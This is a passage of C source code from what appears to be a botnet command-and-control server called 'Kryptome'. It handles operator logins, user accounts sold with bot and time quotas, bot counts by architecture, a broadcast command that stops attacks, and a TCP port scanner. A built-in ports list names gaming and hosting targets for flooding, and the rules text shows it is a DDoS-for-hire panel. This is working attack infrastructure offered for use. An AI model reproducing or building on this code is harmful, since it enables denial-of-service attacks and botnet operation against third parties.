											if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
											memset(xxx, 0, 2048);
										}
									}
									else
									{
										sprintf(xxx, " \x1b[1;96mFailed to add user! Contact admin, (no file access?)\r\n");
										if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
										memset(xxx, 0, 2048);
									}
								}
								else
								{
									sprintf(xxx, " \x1b[1;96mUsage: admin users del <name>\r\n");
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
								}
							}
							else if(!strcmp(args[2], "kick"))
							{
								if(args_len > 3)
								{
									char *username = args[3];
									uint8_t found = 0;
									int x;
									for(x = 0; x < MAXFDS; x++)
									{
										if(managements[x].connected != 1) continue;
										if(strstr(managements[x].username, username) == NULL) continue;
										found = 1;
										pthread_cancel(managements[x].titlewriter_thr);
										sprintf(xxx, " \x1b[1;96mYou have been kicked!\r\n");
										if (send(x, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
										memset(xxx, 0, 2048);
										close(x);
									}
									
									if(found == 1) 
									{
										sprintf(xxx, " \x1b[1;96mKicked user %s!\r\n", username);
										if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
										memset(xxx, 0, 2048);
									}
									else
									{
										sprintf(xxx, " \x1b[1;96mUser %s not online!\r\n", username);
										if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
										memset(xxx, 0, 2048);
									}
								}
								else
								{
									sprintf(xxx, " \x1b[1;96mUsage: admin users kick <name>\r\n");
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
								}
							}
							else if(!strcmp(args[2], "online"))
							{
								sprintf(xxx, " \x1b[1;96mKryptome Online User List\r\n");
								if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
								memset(xxx, 0, 2048);
								int x;
								for(x = 0; x < MAXFDS; x++)
								{
									if(managements[x].connected != 1) continue;
									char level_status[512];
									memset(level_status, 0, 512);
									sprintf(level_status, "User");
									if(managements[x].is_admin == 1)
									{
										memset(level_status, 0, 512);
										sprintf(level_status, "Admin");
									}
									sprintf(xxx, "    \x1b[1;96m[FD%d] || Username: [%s] || Account Level: [%s]\r\n", x, managements[x].username, level_status);
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
								}
							}
							else if(!strcmp(args[2], "list"))
							{
								sprintf(xxx, " \x1b[1;96mKryptome Total User List\r\n");
								if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
								memset(xxx, 0, 2048);
								
								int all_accounts_len = 0;
								struct login_info **all_accounts = auth_get_accounts(&all_accounts_len);
								
								if(all_accounts_len == 0) goto end;

								int x;
								for(x = 0; x < all_accounts_len; x++)
								{
									sprintf(xxx, "\x1b[1;96mUsername: [%s] || Password: [%s] || Account Level: [%s]\r\n", all_accounts[x]->username, all_accounts[x]->password, all_accounts[x]->level);
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
									free(all_accounts[x]);
								}
								free(all_accounts);
							}
							else
							{
								sprintf(xxx, " \x1b[1;96mType \"admin users\" for all commands and context\r\n");
								if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
								memset(xxx, 0, 2048);
							}
						}
						else
						{
							//print out users subcmds usages
							sprintf(xxx, " \x1b[1;96mUsage: admin users add <name> <pass> <admin/user> <time in days/-1> <max bots>  <max conns>\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
							sprintf(xxx, " \x1b[1;96mUsage: admin users del <name>\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
							sprintf(xxx, " \x1b[1;96mUsage: admin users kick <name>\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
							sprintf(xxx, " \x1b[1;96mUsage: admin users online\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
							sprintf(xxx, " \x1b[1;96mUsage: admin users list\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
						}
					}
					else if(!strcmp(args[1], "bots"))
					{
						if(args_len > 2)
						{
							if(!strcmp(args[2], "count"))
							{
								if(args_len == 4)
								{
									if(!strcmp(args[3], "name"))
									{
										usercmds_admin_bots_count_name(datafd);
									}
									else if(!strcmp(args[3], "arch"))
									{
										usercmds_admin_bots_count_architecture(datafd);
									}
									else if(!strcmp(args[3], "ver"))
									{
										usercmds_admin_bots_count_version(datafd);
									}
									else if(!strcmp(args[3], "endian"))
									{
										usercmds_admin_bots_count_endianess(datafd);
									}
									else
									{
										sprintf(xxx, " \x1b[1;96mType \"admin bots\" for all commands and context\r\n");
										if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
										memset(xxx, 0, 2048);
									}
								}
								else
								{
									usercmds_admin_bots_count_name(datafd);
								}
							}
							else
							{
								sprintf(xxx, " \x1b[1;96mType \"admin bots\" for all commands and context\r\n");
								if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
								memset(xxx, 0, 2048);
							}
						}
						else
						{
							sprintf(xxx, " \x1b[1;96mUsage: admin bots count name\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
							sprintf(xxx, " \x1b[1;96mUsage: admin bots count arch\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
							sprintf(xxx, " \x1b[1;96mUsage: admin bots count ver\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
							sprintf(xxx, " \x1b[1;96mUsage: admin bots count endian\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
						}
					}
					else if(!strcmp(args[1], "manage"))
					{
						if(args_len > 2) 
						{
							if(!strcmp(args[2], "listlog"))
							{
								FILE *log_fp = fopen("commands.log", "r");
								if(!log_fp)
								{
									sprintf(xxx, " \x1b[1;96mNo available logs!\r\n");
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
								}
								else
								{
									char *file_buffer = malloc(1024);
									int linecount = 0;
									memset(file_buffer, 0, 1024);
									while(fgets(file_buffer, 1024, log_fp) != NULL)
									{
										linecount++;
										memset(file_buffer, 0, 1024);
									}
									free(file_buffer);
									rewind(log_fp);
									int pos = 0;
									file_buffer = malloc(1024);
									while(fgets(file_buffer, 1024, log_fp) != NULL)
									{
										if(pos > linecount-21)
										{
											sprintf(xxx, "    %s", file_buffer);
											if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
											memset(xxx, 0, 1024);
										}
										pos++;
										memset(file_buffer, 0, 1024);
									}
									free(file_buffer);
								}
							}
							if(!strcmp(args[2], "togglelog"))
							{
								if(managements[datafd].rtlog == 1) 
								{
									managements[datafd].rtlog = 0;
									sprintf(xxx, " \x1b[1;96mToggled Real-Time command logger (off)!\r\n");
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
								} 
								else 
								{
									managements[datafd].rtlog = 1;
									sprintf(xxx, " \x1b[1;96mToggled Real-Time command logger (on)!\r\n");
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
								}
							}
							else if(!strcmp(args[2], "power"))
							{
								//enable/disable
							}
							else
							{
								sprintf(xxx, " \x1b[1;96mType \"admin manage\" for all commands and context\r\n");
								if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
								memset(xxx, 0, 2048);
							}
						}
						else
						{
							// print out management subcmds usages
							sprintf(xxx, " \x1b[1;96mUsage: admin manage listlog\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
							sprintf(xxx, " \x1b[1;96mUsage: admin manage togglelog\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);								
						}						
					}
					else
					{
						sprintf(xxx, " \x1b[1;96mType \"admin\" for all commands and context\r\n");
						if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
						memset(xxx, 0, 2048);
					}
				}
				else
				{
					// print out usages for every sub cmd
					sprintf(xxx, " \x1b[1;96mUsage: admin bots count name\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin bots count arch\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin bots count ver\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin bots count endian\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin users add <name> <pass> <admin/user> <time in days/-1> <max bots>  <max conns>\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin users del <name>\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin users kick <name>\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin users online\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin users list\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin manage listlog\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
					sprintf(xxx, " \x1b[1;96mUsage: admin manage togglelog\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);		
				}
			}
			else
			{
				sprintf(xxx, " \x1b[1;96mYou are not admin level\r\n");
				if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
				memset(xxx, 0, 2048);
			}
		}

		if (!strcmp(args[0], "BOTS") || !strcmp(args[0], "bots") || !strcmp(args[0], "count") || !strcmp(args[0], "COUNT"))
		{
			sprintf(xxx, " \x1b[1;96m Bots Connected: \x1b[97m%d \x1b[1;96mUsers Online: \x1b[97m%d\r\n\x1b[1;96m Duplicated Bots: \x1b[97m%d\r\n", BotsConnected(), get_operator(), get_dup());
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
		}

		if (!strcmp(args[0], "ABOUT") || !strcmp(args[0], "about"))
		{
			sprintf(xxx, " \x1b[1;96mCreated by \x1b[97m@Korpez1 \x1b[92m& \x1b[97m@1m4osec\r\n");
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
		}

		if (!strcmp(args[0], "PORTS") || !strcmp(args[0], "ports"))
		{
			sprintf(xxx, " \x1b[1;96mHome:\x1b[97m 80 / 53 / 22 / 8080\r\n \x1b[1;96mXbox:\x1b[97m 3074\r\n \x1b[1;96mPlaystation:\x1b[97m 9307\r\n \x1b[1;96mNFO:\x1b[97m 1192 / Port Given\r\n \x1b[1;96mOVH:\x1b[97m 1192 / 443 / Port Given\r\n \x1b[1;96mHTTP:\x1b[97m 80 \r\n \x1b[1;96mHTTPS:\x1b[97m 443\r\n");
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
		}

		if (!strcmp(args[0], "RULES") || !strcmp(args[0], "rules"))
		{
			sprintf(xxx, " \x1b[1;96mPlease Read The Following Rules!\r\n Not Following them will result in a ban or blacklist.\r\n \x1b[97m1.) Don't share your spot!\r\n 2.) Do not spam the net!\r\n 3.) Don't hit any goverment websites.\r\n");
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
		}

		if (!strcmp(args[0], "resolve") || !strcmp(args[0], "RESOLVE"))
		{
			// resolver
			char ip[100];
			char *url = args[1];
			trim(url);
			resolve(url, ip);
			sprintf(xxx, " \x1b[97mResolved \x1b[1;96m%s \x1b[97mto \x1b[1;96m%s\r\n", url, ip);
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
		}

		if (!strcmp(args[0], "SCAN ") || !strcmp(args[0], "scan "))	//portscan
		{
			int x;
			int ps_timeout = 1;	// usually set this as 2 or 3 but 1 is faster
			int least_port = 1;
			int max_port = 1200;
			char host[16];
			trim(buf);
			char *token = strtok(buf, " ");
			snprintf(host, sizeof(host), "%s", token + strlen(token) + 1);
			snprintf(xxx, sizeof(xxx), "\x1b[97m[\x1b[1;96mPortscanner\x1b[97m] \x1b[1;96mChecking ports \x1b[97m%d-%d \x1b[1;96mon -> \x1b[97m%s...\x1b[1;96m\r\n", least_port, max_port, host);	//bWFkZSBieSB4eHg=bWFkZSBieSB4eHg=
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			for (x = least_port; x < max_port; x++)
			{
				int Sock = -1;
				struct timeval timeout;
				struct sockaddr_in sock;
				// set timeout secs
				timeout.tv_sec = ps_timeout;
				timeout.tv_usec = 0;
				Sock = socket(AF_INET, SOCK_STREAM, 0);	// create our tcp socket
				setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char*) &timeout, sizeof(timeout));
				setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char*) &timeout, sizeof(timeout));
				sock.sin_family = AF_INET;
				sock.sin_port = htons(x);
				sock.sin_addr.s_addr = inet_addr(host);
				if (connect(Sock, (struct sockaddr *) &sock, sizeof(sock)) == -1) close(Sock);
				else
				{
					snprintf(xxx, sizeof(xxx), "\x1b[97m[\x1b[1;96mPortscanner\x1b[97m]\x1b[1;96m %d \x1b[97mis open on \x1b[1;96m%s!\x1b[97m\r\n", x, host);
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, sizeof(xxx));
					close(Sock);
				}
			}

			snprintf(xxx, sizeof(xxx), "\x1b[97m[\x1b[1;96mPortscanner\x1b[97m] \x1b[97mScan on \x1b[1;96m%s \x1b[97mfinished.\x1b[97m\r\n", host);
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			sleep(3);
		}

		if (!strcmp(args[0], "TOOLS") || !strcmp(args[0], "tools") || !strcmp(args[0], "MORE") || !strcmp(args[0], "more"))
		{
			sprintf(xxx, "\x1b[97m resolve (website.com)\r\n");
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
			
			sprintf(xxx, "\x1b[97m scan (target)\r\n");
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
		}

		if (!strcmp(args[0], "EXTRA") || !strcmp(args[0], "extra") || !strcmp(args[0], "SERVER") || !strcmp(args[0], "server"))
		{
			char xextraxlinex1[80];
			char xextraxlinex2[80];
			char xextraxlinex3[80];
			char xextraxlinex4[80];
			char xextraxlinex5[80];

			sprintf(xextraxlinex1, "\x1b[97m PORTS  \r\n");
			sprintf(xextraxlinex2, "\x1b[97m BOTS   \r\n");
			sprintf(xextraxlinex3, "\x1b[97m CLEAR  \r\n");
			sprintf(xextraxlinex4, "\x1b[97m RULES  \r\n");
			sprintf(xextraxlinex5, "\x1b[97m ABOUT  \r\n");
			
			if (send(datafd, xextraxlinex1, strlen(xextraxlinex1), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, xextraxlinex2, strlen(xextraxlinex2), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, xextraxlinex3, strlen(xextraxlinex3), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, xextraxlinex4, strlen(xextraxlinex4), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, xextraxlinex5, strlen(xextraxlinex5), MSG_NOSIGNAL) == -1) goto end;
		}

		if (!strcmp(args[0], "STOP") || !strcmp(args[0], "stop"))
		{
			char killattack[2048];
			memset(killattack, 0, 2048);
			char killattack_msg[2048];

			sprintf(killattack, " \x1b[97msuccessfully stopped attack!\r\n");
			if (send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
		}
		if(strstr(buf, "!* STOP") || strstr(buf, "!* Stop") || strstr(buf, "!* stop"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[0m Stopping Attacks...\r\n");
				broadcast("!* STOP", -1);
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
		if (!strcmp(args[0], "CLEAR") || !strcmp(args[0], "clear") || !strcmp(args[0], "cls") || !strcmp(args[0], "CLS"))
		{
			if (send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze1, strlen(instagram_Korpze1), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze2, strlen(instagram_Korpze2), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze3, strlen(instagram_Korpze3), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze4, strlen(instagram_Korpze4), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze5, strlen(instagram_Korpze5), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze6, strlen(instagram_Korpze6), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze7, strlen(instagram_Korpze7), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze8, strlen(instagram_Korpze8), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze9, strlen(instagram_Korpze9), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze10, strlen(instagram_Korpze10), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze11, strlen(instagram_Korpze11), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze12, strlen(instagram_Korpze12), MSG_NOSIGNAL) == -1) goto end;
			if (send(datafd, instagram_Korpze13, strlen(instagram_Korpze13), MSG_NOSIGNAL) == -1) goto end;
			admin_print_motd(datafd);
		}

		if (!strcmp(args[0], "LOGOUT") || !strcmp(args[0], "logout") || !strcmp(args[0], "EXIT") || !strcmp(args[0], "exit") || !strcmp(args[0], "@"))
		{
			sprintf(xxx, " Logging out %s!", managements[datafd].username, buf);
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
			sleep(3);
			goto end;
		}

		admin_send_prompt(datafd);
		printf("%s: \"%s\"\n", managements[datafd].username, buf);
		
		admin_log_cmd(buf, datafd);
		
		memset(buf, 0, 2048);
	}

	end:
	if(managements[datafd].connected == 1) {
		//pthread_cancel(managements[datafd].titlewriter_thr);
	}
	managements[datafd].connected = 0;
	close(datafd);
	del_operator();
}


